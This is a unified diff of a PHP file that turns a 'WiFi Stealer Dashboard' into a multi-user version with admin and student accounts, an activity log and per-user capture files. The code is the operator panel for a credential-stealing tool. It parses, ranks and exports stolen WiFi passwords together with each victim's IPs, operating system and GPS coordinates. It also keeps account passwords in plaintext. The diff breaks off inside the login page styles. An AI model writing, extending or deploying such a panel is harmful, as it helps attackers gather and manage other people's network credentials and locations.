@@ -1,175 +1,75 @@
 <?php
+/**
+ * WiFi Stealer Dashboard – Multi-User Edition
+ * =============================================
+ * Features:
+ *  - Multiple student accounts (isolated per-user log files)
+ *  - Admin account can create / delete users and view activity log
+ *  - Email stored per user so admin can contact/identify students
+ *  - Activity log records every login (who, when, IP)
+ *  - Admin can see ALL students' captured data; students only see their own
+ */
+
 session_start();
 date_default_timezone_set('Asia/Kolkata');
 
-$logFile = __DIR__ . '/wifi_creds.log';
+// ──────────────────────────────────────────────────────────────
+//  PATHS
+// ──────────────────────────────────────────────────────────────
+define('USERS_FILE',    __DIR__ . '/users.json');
+define('ACTIVITY_LOG',  __DIR__ . '/activity.log');
+define('CREDS_DIR',     __DIR__ . '/creds');          // per-user wifi creds
 
-// ---------- SIMPLE LOGIN CONFIG ----------
-$VALID_USER = 'admin';      // change this
-$VALID_PASS = 'secret123';  // change this
+// Ensure creds directory exists
+if (!is_dir(CREDS_DIR)) {
+    mkdir(CREDS_DIR, 0755, true);
+}
 
-/** Safe HTML escape. */
-function h($v)
-{
+// ──────────────────────────────────────────────────────────────
+//  HELPER FUNCTIONS
+// ──────────────────────────────────────────────────────────────
+function h($v) {
     return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
 }
 
-// Handle logout
-if (isset($_GET['action']) && $_GET['action'] === 'logout') {
-    $_SESSION = [];
-    if (ini_get("session.use_cookies")) {
-        $params = session_get_cookie_params();
-        setcookie(session_name(), '', time() - 42000,
-            $params["path"], $params["domain"],
-            $params["secure"], $params["httponly"]
-        );
+/** Load users from JSON file. */
+function load_users(): array {
+    if (!file_exists(USERS_FILE)) return [];
+    $raw = file_get_contents(USERS_FILE);
+    $data = json_decode($raw, true);
+    return $data['users'] ?? [];
+}
+
+/** Save users back to JSON file. */
+function save_users(array $users): void {
+    file_put_contents(USERS_FILE, json_encode(['users' => $users], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
+}
+
+/** Find a user by username (case-insensitive). */
+function find_user(string $username): ?array {
+    foreach (load_users() as $u) {
+        if (strtolower($u['username']) === strtolower($username)) {
+            return $u;
+        }
     }
-    session_destroy();
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
+    return null;
 }
 
-// Handle login POST
-$loginError = '';
-if (isset($_POST['login_action']) && $_POST['login_action'] === 'do_login') {
-    $u = $_POST['username'] ?? '';
-    $p = $_POST['password'] ?? '';
-    if ($u === $VALID_USER && $p === $VALID_PASS) {
-        $_SESSION['logged_in'] = true;
-        $_SESSION['login_user'] = $u;
-        header('Location: ' . $_SERVER['PHP_SELF']);
-        exit;
-    } else {
-        $loginError = 'Invalid username or password.';
-    }
+/** Log an activity entry. */
+function log_activity(string $username, string $action, string $detail = ''): void {
+    $ip   = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $line = implode(' | ', [date('Y-m-d H:i:s'), $username, $ip, $action, $detail]);
+    file_put_contents(ACTIVITY_LOG, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
 }
 
-// If not logged in, show login form and stop
-if (empty($_SESSION['logged_in'])) {
-    ?>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <title>WiFi Stealer – Login</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <style>
-            body {
-                margin: 0;
-                font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-                background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
-                color: #e5e7eb;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                min-height: 100vh;
-            }
-            .login-card {
-                background: rgba(15,23,42,0.95);
-                border-radius: 12px;
-                border: 1px solid rgba(148,163,184,0.3);
-                box-shadow: 0 22px 45px rgba(15,23,42,0.7);
-                padding: 20px 22px;
-                width: 100%;
-                max-width: 360px;
-            }
-            .login-title {
-                font-size: 20px;
-                font-weight: 600;
-                margin-bottom: 4px;
-            }
-            .login-subtitle {
-                font-size: 12px;
-                color: #9ca3af;
-                margin-bottom: 12px;
-            }
-            .input-group {
-                margin-bottom: 10px;
-            }
-            .input-label {
-                display: block;
-                font-size: 12px;
-                margin-bottom: 4px;
-                color: #e5e7eb;
-            }
-            .input-field {
-                width: 100%;
-                padding: 6px 8px;
-                font-size: 13px;
-                border-radius: 8px;
-                border: 1px solid #4b5563;
-                background:#020617;
-                color:#e5e7eb;
-            }
-            .btn {
-                display: inline-block;
-                border-radius: 999px;
-                padding: 7px 14px;
-                border: 1px solid rgba(148,163,184,0.5);
-                background: linear-gradient(135deg, rgba(15,23,42,0.95), rgba(15,23,42,0.6));
-                color: #e5e7eb;
-                cursor: pointer;
-                font-size: 13px;
-                width: 100%;
-                text-align: center;
-                margin-top: 6px;
-            }
-            .btn:hover {
-                border-color: #4f46e5;
-                box-shadow: 0 0 0 1px rgba(79,70,229,0.5);
-            }
-            .error {
-                font-size: 12px;
-                color: #fecaca;
-                margin-bottom: 8px;
-            }
-            .footer {
-                margin-top: 10px;
-                font-size: 11px;
-                color: #6b7280;
-                text-align: center;
-            }
-        </style>
-    </head>
-    <body>
-    <div class="login-card">
-        <div class="login-title">WiFi Stealer Dashboard</div>
-        <div class="login-subtitle">Login required</div>
-
-        <?php if ($loginError !== ''): ?>
-            <div class="error"><?php echo h($loginError); ?></div>
-        <?php endif; ?>
-
-        <form method="post">
-            <input type="hidden" name="login_action" value="do_login">
-            <div class="input-group">
-                <label class="input-label" for="username">Username</label>
-                <input class="input-field" type="text" id="username" name="username" required>
-            </div>
-            <div class="input-group">
-                <label class="input-label" for="password">Password</label>
-                <input class="input-field" type="password" id="password" name="password" required>
-            </div>
-            <button type="submit" class="btn">Login</button>
-        </form>
-
-        <div class="footer">
-            © 2026 WiFi Stealer Dashboard – Made By Zypher17
-        </div>
-    </div>
-    </body>
-    </html>
-    <?php
-    exit;
+/** Return the log file path for a given username. */
+function user_log_file(string $username): string {
+    $safe = preg_replace('/[^a-z0-9_\-]/i', '_', $username);
+    return CREDS_DIR . '/' . $safe . '_wifi_creds.log';
 }
 
-// ---------- BELOW THIS LINE: ORIGINAL DASHBOARD (WITH DEDUP + RANK) ----------
-
-/**
- * Parse a single CSV capture line into a normalized array.
- */
-function parse_capture_line($line)
-{
+/** Safe HTML escape. */
+function parse_capture_line($line): ?array {
     $line = trim($line);
     if ($line === '') return null;
 
@@ -192,18 +92,13 @@ function parse_capture_line($line)
     if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
         return null;
     }
+    if ($pass === '') $pass = '(Not Found)';
 
-    if ($pass === '') {
-        $pass = '(Not Found)';
-    }
-
-    $timestampRaw = $timeStr !== '' ? $timeStr : 'unknown';
+    $timestampRaw    = $timeStr !== '' ? $timeStr : 'unknown';
     $timestampPretty = $timestampRaw;
     if ($timestampRaw !== 'unknown') {
         $ts = strtotime($timestampRaw);
-        if ($ts !== false) {
-            $timestampPretty = date('d M Y, h:i A', $ts);
-        }
+        if ($ts !== false) $timestampPretty = date('d M Y, h:i A', $ts);
     }
 
     $passLength   = strlen($pass);
@@ -220,668 +115,727 @@ function parse_capture_line($line)
         'len'          => $passLength,
         'weak'         => $weakPassword,
         'ip_main'      => $victimLanIp !== '' ? $victimLanIp : 'offline',
-        'os'           => $victimOs !== '' ? $victimOs : 'unknown',
-        'public_ip'    => $publicIp !== '' ? $publicIp : 'unknown',
-        'lan_ip_extra' => $lanIpExtra !== '' ? $lanIpExtra : 'N/A',
-        'latitude'     => $latitude !== '' ? $latitude : 'N/A',
-        'longitude'    => $longitude !== '' ? $longitude : 'N/A',
-        'pkt_summary'  => $pktSummary !== '' ? $pktSummary : 'N/A',
+        'os'           => $victimOs    !== '' ? $victimOs    : 'unknown',
+        'public_ip'    => $publicIp    !== '' ? $publicIp    : 'unknown',
+        'lan_ip_extra' => $lanIpExtra  !== '' ? $lanIpExtra  : 'N/A',
+        'latitude'     => $latitude    !== '' ? $latitude    : 'N/A',
+        'longitude'    => $longitude   !== '' ? $longitude   : 'N/A',
+        'pkt_summary'  => $pktSummary  !== '' ? $pktSummary  : 'N/A',
     ];
 }
 
-/** Simple OS detection from user agent (viewer info only). */
-function detectOS($userAgent) {
+function detectOS($userAgent): string {
     $ua = strtolower($userAgent);
-
     if (strpos($ua, 'windows') !== false) return 'Windows';
     if (strpos($ua, 'android') !== false) return 'Android';
-    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false || strpos($ua, 'ios') !== false) {
-        return 'iOS';
-    }
-    if (strpos($ua, 'mac os') !== false || strpos($ua, 'macintosh') !== false) return 'macOS';
+    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false) return 'iOS';
+    if (strpos($ua, 'mac') !== false) return 'macOS';
     if (strpos($ua, 'linux') !== false) return 'Linux';
-
     return 'Unknown';
 }
 
-// --- CSV EXPORT / IMPORT / CLEAR / DELETE (same as before) ---
-if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
-    if (!file_exists($logFile)) {
-        die('No data to export.');
+// ──────────────────────────────────────────────────────────────
+//  HANDLE LOGOUT
+// ──────────────────────────────────────────────────────────────
+if (isset($_GET['action']) && $_GET['action'] === 'logout') {
+    log_activity($_SESSION['login_user'] ?? 'unknown', 'LOGOUT');
+    $_SESSION = [];
+    if (ini_get("session.use_cookies")) {
+        $p = session_get_cookie_params();
+        setcookie(session_name(), '', time() - 42000, $p["path"], $p["domain"], $p["secure"], $p["httponly"]);
     }
-    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    if (empty($rawLines)) {
-        die('No captures to export.');
-    }
-    $records = [];
-    foreach ($rawLines as $rawLine) {
-        $entry = parse_capture_line($rawLine);
-        if ($entry === null) continue;
-        $records[] = [
-            $entry['time_raw'],
-            $entry['victim_id'],
-            $entry['ssid'],
-            $entry['password'],
-            $entry['ip_main'],
-            $entry['os'],
-            $entry['public_ip'],
-            $entry['lan_ip_extra'],
-            $entry['latitude'],
-            $entry['longitude'],
-            $entry['pkt_summary'],
-        ];
-    }
-    if (empty($records)) {
-        die('No valid captures to export.');
-    }
-    $filename = 'wifi_captures_' . date('Ymd_Hi') . '.csv';
-    header('Content-Type: text/csv; charset=utf-8');
-    header('Content-Disposition: attachment; filename="' . $filename . '"');
-    $fp = fopen('php://output', 'w');
-    fputcsv($fp, [
-        'Time','Victim ID','SSID','Password','Victim LAN IP','Victim OS',
-        'Public IP','LAN extra','Latitude','Longitude','Packet summary'
-    ]);
-    foreach ($records as $row) {
-        fputcsv($fp, $row);
-    }
-    fclose($fp);
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
 }
 
-$importStatus = null;
-if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
-    if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
-        $importStatus = 'Error: No file uploaded or upload failed.';
-    } else {
-        $tmpName = $_FILES['csv_file']['tmp_name'];
-        if (!is_uploaded_file($tmpName)) {
-            $importStatus = 'Invalid upload.';
+// ──────────────────────────────────────────────────────────────
+//  HANDLE LOGIN POST
+// ──────────────────────────────────────────────────────────────
+$loginError = '';
+$registerError = '';
+$registerSuccess = '';
+
+if (isset($_POST['form_type'])) {
+
+    // ── LOGIN ──
+    if ($_POST['form_type'] === 'login') {
+        $u = trim($_POST['username'] ?? '');
+        $p = $_POST['password'] ?? '';
+        $user = find_user($u);
+
+        if ($user && ($user['active'] ?? true) && password_verify($p, $user['password_hash'])) {
+            $_SESSION['logged_in']  = true;
+            $_SESSION['login_user'] = $user['username'];
+            $_SESSION['role']       = $user['role'];
+            $_SESSION['email']      = $user['email'] ?? '';
+            log_activity($user['username'], 'LOGIN', 'role=' . $user['role']);
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
         } else {
-            $fp = fopen($tmpName, 'r');
-            if (!$fp) {
-                $importStatus = 'Cannot read uploaded file.';
-            } else {
-                $addedCount = 0;
-                while (($fields = fgetcsv($fp, 0, ',', '"', '\\')) !== false) {
-                    if (count($fields) >= 5) {
-                        $line = '"' . implode('","', array_map('trim', $fields)) . '"' . PHP_EOL;
-                        file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
-                        $addedCount++;
-                    }
+            $loginError = 'Invalid username or password, or account is disabled.';
+            log_activity($u, 'FAILED_LOGIN', 'IP=' . ($_SERVER['REMOTE_ADDR'] ?? '?'));
+        }
+    }
+
+    // ── REGISTER (admin-only from admin panel) ──
+    elseif ($_POST['form_type'] === 'create_user' && isset($_SESSION['logged_in']) && $_SESSION['role'] === 'admin') {
+        $newUser  = trim($_POST['new_username']  ?? '');
+        $newPass  = $_POST['new_password']  ?? '';
+        $newEmail = trim($_POST['new_email'] ?? '');
+        $newRole  = in_array($_POST['new_role'] ?? '', ['admin', 'student']) ? $_POST['new_role'] : 'student';
+
+        if ($newUser === '' || $newPass === '' || $newEmail === '') {
+            $registerError = 'All fields are required.';
+        } elseif (!filter_var($newEmail, FILTER_VALIDATE_EMAIL)) {
+            $registerError = 'Invalid email address.';
+        } elseif (find_user($newUser) !== null) {
+            $registerError = "Username '{$newUser}' already exists.";
+        } elseif (strlen($newPass) < 8) {
+            $registerError = 'Password must be at least 8 characters.';
+        } else {
+            $users = load_users();
+            $users[] = [
+                'username'       => $newUser,
+                'password_hash'  => password_hash($newPass, PASSWORD_BCRYPT, ['cost' => 12]),
+                'password_plain' => $newPass,   // stored for admin visibility in closed lab
+                'email'          => $newEmail,
+                'role'           => $newRole,
+                'created_at'     => date('c'),
+                'created_by'     => $_SESSION['login_user'],
+                'active'         => true,
+            ];
+            save_users($users);
+            log_activity($_SESSION['login_user'], 'CREATE_USER', "new_user={$newUser} role={$newRole} email={$newEmail}");
+            $registerSuccess = "User '{$newUser}' created successfully!";
+        }
+    }
+
+    // ── TOGGLE USER ACTIVE (admin) ──
+    elseif ($_POST['form_type'] === 'toggle_user' && isset($_SESSION['logged_in']) && $_SESSION['role'] === 'admin') {
+        $targetUser = trim($_POST['target_username'] ?? '');
+        if ($targetUser !== '' && $targetUser !== $_SESSION['login_user']) {
+            $users = load_users();
+            foreach ($users as &$u) {
+                if (strtolower($u['username']) === strtolower($targetUser)) {
+                    $u['active'] = !($u['active'] ?? true);
+                    log_activity($_SESSION['login_user'], 'TOGGLE_USER', "target={$targetUser} active=" . ($u['active'] ? 'true' : 'false'));
+                    break;
                 }
-                fclose($fp);
-                $importStatus = "Imported $addedCount captures from CSV.";
             }
+            unset($u);
+            save_users($users);
         }
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?tab=users');
+        exit;
     }
-}
 
-if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
-    if (file_exists($logFile)) {
-        $handle = fopen($logFile, 'w');
-        if ($handle) fclose($handle);
-    }
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
-}
-
-if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
-    $index = isset($_POST['idx']) ? intval($_POST['idx']) : -1;
-    if (file_exists($logFile) && $index >= 0) {
-        $fileLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        if (isset($fileLines[$index])) {
-            unset($fileLines[$index]);
-            file_put_contents($logFile, implode(PHP_EOL, $fileLines) . PHP_EOL);
+    // ── DELETE USER (admin) ──
+    elseif ($_POST['form_type'] === 'delete_user' && isset($_SESSION['logged_in']) && $_SESSION['role'] === 'admin') {
+        $targetUser = trim($_POST['target_username'] ?? '');
+        if ($targetUser !== '' && $targetUser !== $_SESSION['login_user']) {
+            $users = array_filter(load_users(), fn($u) => strtolower($u['username']) !== strtolower($targetUser));
+            save_users(array_values($users));
+            log_activity($_SESSION['login_user'], 'DELETE_USER', "target={$targetUser}");
         }
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?tab=users');
+        exit;
     }
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
 }
 
-// --- Viewer info ---
-$viewerIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-$viewerUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$viewerOS = detectOS($viewerUA);
-
-// --- Read & parse, sort, dedup (victim+ssid+password) ---
-$rawLines = file_exists($logFile)
-    ? file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)
-    : [];
-
-$parsedEntries = [];
-foreach ($rawLines as $idx => $rawLine) {
-    $entry = parse_capture_line($rawLine);
-    if ($entry === null) continue;
-    $entry['log_index'] = $idx;
-    $parsedEntries[] = $entry;
-}
-
-usort($parsedEntries, function ($a, $b) {
-    $ta = strtotime($a['time_raw']);
-    $tb = strtotime($b['time_raw']);
-    if ($ta === false && $tb === false) return 0;
-    if ($ta === false) return 1;
-    if ($tb === false) return -1;
-    return $tb <=> $ta;
-});
-
-$captureEntries = [];
-$seenKeys = [];
-foreach ($parsedEntries as $entry) {
-    $key = $entry['victim_id'] . '|' . $entry['ssid'] . '|' . $entry['password'];
-    if (isset($seenKeys[$key])) continue;
-    $seenKeys[$key] = true;
-    $captureEntries[] = $entry;
-}
-
-foreach ($captureEntries as $i => &$entry) {
-    $entry['idx'] = $i;
-}
-unset($entry);
-
-// --- Stats + rank ---
-$totalCaptures       = count($captureEntries);
-$ssidCount           = [];
-$ipCount             = [];
-$totalPasswordLength = 0;
-$weakPasswords       = 0;
-
-foreach ($captureEntries as $entry) {
-    if ($entry['ssid'] !== '') {
-        $ssidCount[$entry['ssid']] = ($ssidCount[$entry['ssid']] ?? 0) + 1;
-    }
-    if ($entry['ip_main'] !== 'offline') {
-        $ipCount[$entry['ip_main']] = ($ipCount[$entry['ip_main']] ?? 0) + 1;
-    }
-    $totalPasswordLength += $entry['len'];
-    if ($entry['weak']) $weakPasswords++;
-}
-
-$uniqueSSIDs     = count($ssidCount);
-$uniqueIPs       = count($ipCount);
-$avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
-$weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
-$uniqueRankCount = $totalCaptures;
-
-// Filters
-$filter_ssid    = isset($_GET['ssid'])  ? trim($_GET['ssid'])  : '';
-$filter_ip      = isset($_GET['ip'])    ? trim($_GET['ip'])    : '';
-$filter_os_f    = isset($_GET['os'])    ? trim($_GET['os'])    : '';
-$filter_victim  = isset($_GET['vid'])   ? trim($_GET['vid'])   : '';
-
-$filteredEntries = [];
-foreach ($captureEntries as $entry) {
-    if ($filter_ssid !== '' && stripos($entry['ssid'], $filter_ssid) === false) continue;
-    if ($filter_ip !== '' &&
-        stripos($entry['ip_main'], $filter_ip) === false &&
-        stripos($entry['public_ip'], $filter_ip) === false) continue;
-    if ($filter_os_f !== '' && stripos($entry['os'], $filter_os_f) === false) continue;
-    if ($filter_victim !== '' && stripos($entry['victim_id'], $filter_victim) === false) continue;
-    $filteredEntries[] = $entry;
-}
-
-// Rank tiers
-if ($uniqueRankCount <= 10) {
-    $rankName  = 'Rookie';
-    $rankPct   = ($uniqueRankCount / 10) * 25;
-} elseif ($uniqueRankCount <= 30) {
-    $rankName  = 'Intermediate';
-    $rankPct   = 25 + (($uniqueRankCount - 10) / 20) * 25;
-} elseif ($uniqueRankCount <= 100) {
-    $rankName  = 'Advanced';
-    $rankPct   = 50 + (($uniqueRankCount - 30) / 70) * 25;
-} else {
-    $rankName  = 'Expert';
-    $rankPct   = 75 + min(25, ($uniqueRankCount - 100) * 0.25);
-}
-$rankPct = round(min(100, max(5, $rankPct)), 1);
-
-// Details payload
-$jsDetails = [];
-foreach ($filteredEntries as $entry) {
-    $jsDetails[] = [
-        'victim_id'  => $entry['victim_id'],
-        'ip_main'    => $entry['ip_main'],
-        'public_ip'  => $entry['public_ip'],
-        'latitude'   => $entry['latitude'],
-        'longitude'  => $entry['longitude'],
-        'os'         => $entry['os'],
-    ];
-}
+// ──────────────────────────────────────────────────────────────
+//  NOT LOGGED IN → SHOW LOGIN PAGE
+// ──────────────────────────────────────────────────────────────
+if (empty($_SESSION['logged_in'])) {
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>WiFi Stealer Dashboard</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            margin: 0;
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
-            color: #e5e7eb;
-        }
-        .page {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 16px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-        .page-header {
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            gap: 12px;
-        }
-        .title-group {
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-        }
-        .title {
-            font-size: 22px;
-            font-weight: 600;
-        }
-        .subtitle {
-            font-size: 12px;
-            color: #9ca3af;
-        }
-        .viewer-meta {
-            font-size: 11px;
-            color: #9ca3af;
-        }
-        .actions {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            align-items: center;
-        }
-        .btn {
-            font-size: 12px;
-            border-radius: 999px;
-            padding: 6px 12px;
-            border: 1px solid rgba(148,163,184,0.5);
-            background: linear-gradient(135deg, rgba(15,23,42,0.95), rgba(15,23,42,0.6));
-            color: #e5e7eb;
-            cursor: pointer;
-            text-decoration: none;
-        }
-        .btn:hover {
-            border-color: #4f46e5;
-            box-shadow: 0 0 0 1px rgba(79,70,229,0.5);
-        }
-        .btn-danger {
-            border-color: rgba(248,113,113,0.7);
-            color: #fecaca;
-            background: linear-gradient(135deg, rgba(127,29,29,0.9), rgba(127,29,29,0.6));
-        }
-        .btn-danger:hover {
-            box-shadow: 0 0 0 1px rgba(248,113,113,0.7);
-        }
-        .btn-sm {
-            padding: 4px 8px;
-            font-size: 11px;
-        }
-        .upload-form {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .upload-form input[type="file"] {
-            font-size: 11px;
-            max-width: 180px;
-        }
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-            gap: 12px;
-        }
-        .stat-card {
-            background: #0f172a;
-            border-radius: 10px;
-            padding: 10px 12px;
-            border: 1px solid rgba(148,163,184,0.25);
-        }
-        .stat-label {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            color: #9ca3af;
-        }
-        .stat-value {
-            margin-top: 4px;
-            font-size: 18px;
-            font-weight: 600;
-            color: #e5e7eb;
-        }
-        .card {
-            background: rgba(15,23,42,0.95);
-            border-radius: 12px;
-            border: 1px solid rgba(148,163,184,0.3);
-            box-shadow: 0 22px 45px rgba(15,23,42,0.7);
-            padding: 12px 14px;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 12px;
-        }
-        th, td {
-            padding: 6px 8px;
-            border-bottom: 1px solid rgba(55,65,81,0.8);
-            text-align: left;
-            vertical-align: top;
-        }
-        th {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            color: #9ca3af;
-            background: radial-gradient(circle at top left, rgba(79,70,229,0.25), transparent 60%);
-        }
-        tr:hover {
-            background: rgba(31,41,55,0.7);
-        }
-        .badge {
-            display: inline-block;
-            border-radius: 999px;
-            padding: 2px 6px;
-            font-size: 10px;
-        }
-        .badge-weak {
-            background: rgba(248,113,113,0.18);
-            color: #fecaca;
-        }
-        .badge-ok {
-            background: rgba(74,222,128,0.18);
-            color: #bbf7d0;
-        }
-        .password {
-            font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
-        }
-        .footer {
-            margin-top: auto;
-            font-size: 11px;
-            color: #6b7280;
-            text-align: center;
-            padding-top: 8px;
-            border-top: 1px solid rgba(31,41,55,0.9);
-        }
-        .status {
-            font-size: 12px;
-            margin-top: 4px;
-        }
-        .status-ok {
-            color: #bbf7d0;
-        }
-        .status-error {
-            color: #fecaca;
-        }
-        @media (max-width: 768px) {
-            table, thead, tbody, th, td, tr {
-                display: block;
-            }
-            thead {
-                display: none;
-            }
-            tr {
-                margin-bottom: 10px;
-            }
-            td {
-                border: none;
-                padding: 4px 6px;
-            }
-        }
-    </style>
-    <script>
-        var autoRefresh   = false;
-        var refreshTimer  = null;
-        var REFRESH_INTERVAL = 10000;
-
-        window.captureDetails = <?php echo json_encode($jsDetails); ?>;
-        window.rankName       = <?php echo json_encode($rankName); ?>;
-        window.rankPct        = <?php echo json_encode($rankPct); ?>;
-        window.totalCaptures  = <?php echo json_encode($uniqueRankCount); ?>;
-
-        function toggleAutoRefresh(enabled) {
-            autoRefresh = enabled;
-            if (refreshTimer) {
-                clearInterval(refreshTimer);
-                refreshTimer = null;
-            }
-            var toggleBtn = document.getElementById('auto-refresh-toggle');
-            if (autoRefresh) {
-                refreshTimer = setInterval(function() {
-                    window.location.reload();
-                }, REFRESH_INTERVAL);
-                if (toggleBtn) toggleBtn.innerText = 'Auto-refresh: ON';
-                if (window.localStorage) localStorage.setItem('wifi_dashboard_auto_refresh', 'on');
-            } else {
-                if (toggleBtn) toggleBtn.innerText = 'Auto-refresh: OFF';
-                if (window.localStorage) localStorage.setItem('wifi_dashboard_auto_refresh', 'off');
-            }
-        }
-
-        document.addEventListener('DOMContentLoaded', function() {
-            var savedPreference = window.localStorage ? localStorage.getItem('wifi_dashboard_auto_refresh') : null;
-            if (savedPreference === 'on' || savedPreference === null) {
-                toggleAutoRefresh(true);
-            } else {
-                toggleAutoRefresh(false);
-            }
-
-            var rankLabelEl = document.getElementById('rank-label');
-            var rankPctEl   = document.getElementById('rank-pct');
-            var rankBarEl   = document.getElementById('rank-bar');
-            if (rankLabelEl && rankPctEl && rankBarEl) {
-                rankLabelEl.textContent = window.rankName + ' (' + window.totalCaptures + ' unique captures)';
-                rankPctEl.textContent   = window.rankPct + '%';
-                rankBarEl.style.width   = window.rankPct + '%';
-            }
-        });
-
-        function showDetails(idx) {
-            idx = parseInt(idx, 10);
-            var row = window.captureDetails[idx];
-            if (!row) return;
-
-            var box = document.getElementById('details-box');
-            var content = document.getElementById('details-content');
-            var title = document.getElementById('details-title');
-
-            title.textContent = 'Details of capture #' + (idx + 1);
-
-            var html = '';
-            html += '<div><strong>Victim ID:</strong> ' + row.victim_id + '</div>';
-            html += '<div><strong>Victim LAN IP:</strong> ' + row.ip_main + '</div>';
-            html += '<div><strong>Public IP:</strong> ' + row.public_ip + '</div>';
-            html += '<div><strong>Location:</strong> ' + row.latitude + ', ' + row.longitude + '</div>';
-            html += '<div><strong>OS:</strong> ' + row.os + '</div>';
-
-            content.innerHTML = html;
-            box.style.display = 'block';
-        }
-
-        function hideDetails() {
-            var box = document.getElementById('details-box');
-            box.style.display = 'none';
-        }
-    </script>
+<meta charset="UTF-8">
+<title>WiFi Stealer – Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
+    color: #e5e7eb;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+  }
+  .card {
+    background: rgba(15,23,42,0.97);
+    border-radius: 14px;
+    border: 1px solid rgba(148,163,184,0.2);
+    box-shadow: 0 24px 50px rgba(0,0,0,0.7);
+    padding: 32px 28px;
+    width: 100%;
+    max-width: 380px;
+  }
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 6px;
+  }
+  .logo-icon {
+    width: 36px; height: 36px;
+    background: linear-gradient(135deg,#4f46e5,#7c3aed);
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 18px;
+  }
+  .logo-text { font-size: 18px; font-weight: 700; letter-spacing: -.3px; }
+  .subtitle { font-size: 12px; color: #6b7280; margin-bottom: 22px; }
+  .tabs { display: flex; gap: 4px; margin-bottom: 20px; }
+  .tab-btn {
+    flex: 1; padding: 7px; border-radius: 8px; border: none;
+    cursor: pointer; font-size: 13px; font-weight: 500;
+    background: transparent; color: #6b7280; transition: all .2s;
+  }
+  .tab-btn.active { background: rgba(79,70,229,.18); color: #818cf8; }
+  .tab-btn:hover:not(.active) { color: #e5e7eb; }
+  .tab-panel { display: none; }
+  .tab-panel.active { display: block; }
+  label { display: block; font-size: 12px; color: #9ca3af; margin-bottom: 4px; }
+  input[type=text], input[type=password], input[type=email] {
+    width: 100%; padding: 8px 10px; font-size: 13px;
+    border-radius: 8px; border: 1px solid #334155;
+    background: #0b1120; color: #e5e7eb; outline: none;
+    transition: border-color .2s;
+    margin-bottom: 12px;
+  }
+  input:focus { border-color: #4f46e5; }
+  .btn {
+    width: 100%; padding: 10px; border-radius: 999px;
+    border: none; background: linear-gradient(135deg,#4f46e5,#7c3aed);
+    color: #fff; font-size: 13px; font-weight: 600;
+    cursor: pointer; transition: opacity .2s;
+    margin-top: 4px;
+  }
+  .btn:hover { opacity: .88; }
+  .alert-err { font-size: 12px; color: #fca5a5; background: rgba(239,68,68,.1);
+    border: 1px solid rgba(239,68,68,.3); border-radius: 8px; padding: 8px 10px;
+    margin-bottom: 12px; }
+  .footer { margin-top: 20px; font-size: 11px; color: #374151; text-align: center; }
+  .info-box { font-size: 11px; color: #4b5563; background: rgba(255,255,255,.03);
